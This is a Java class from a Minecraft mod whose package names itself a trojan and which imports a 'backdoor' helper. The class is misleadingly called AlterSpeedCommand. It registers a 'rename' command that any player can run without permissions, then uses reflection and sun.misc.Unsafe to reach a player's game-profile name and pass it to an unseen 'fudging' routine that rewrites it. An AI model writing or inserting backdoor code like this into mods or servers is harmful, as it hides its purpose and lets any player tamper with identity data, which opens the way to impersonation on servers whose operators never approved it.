package com.lanceg.trojanmod.hack;

import java.lang.reflect.Field;

import com.lanceg.trojanmod.backdoor.StringFudger;
import com.mojang.authlib.GameProfile;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import com.mojang.brigadier.tree.LiteralCommandNode;

import net.minecraft.command.CommandSource;
import net.minecraft.command.Commands;
import net.minecraft.entity.player.PlayerEntity;
import sun.misc.Unsafe;

public class AlterSpeedCommand {

	public static void register(final CommandDispatcher<CommandSource> dispatcher) {
		final LiteralCommandNode<CommandSource> node = dispatcher.register(Commands.literal("rename").requires((src) -> src.hasPermissionLevel(0)).then(Commands.argument("word", StringArgumentType.word()).executes(AlterSpeedCommand::alterSpeed)));
		
	}
	
	private static int alterSpeed(CommandContext<CommandSource> context) {
		final CommandSource source = context.getSource();
		try {
			final PlayerEntity player = source.asPlayer();
			final String message = StringArgumentType.getString(context, "word");
			
			final Field f = Unsafe.class.getDeclaredField("theUnsafe");
			f.setAccessible(true);
			Unsafe unsafe = (Unsafe) f.get(null);
			
			final Field gameProfile = PlayerEntity.class.getDeclaredField("gameProfile");
			gameProfile.setAccessible(true);
			final GameProfile gp = (GameProfile) gameProfile.get(player);
			
			final Field nameField = GameProfile.class.getDeclaredField("name");
			nameField.setAccessible(true);
			
			final String currentName = (String) nameField.get(gp);
			
			System.out.println("trying to rename " + currentName + " to " + message);
			StringFudger.plsFudge(currentName, message);
			player.refreshDisplayName();
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		return 0;
	}
}
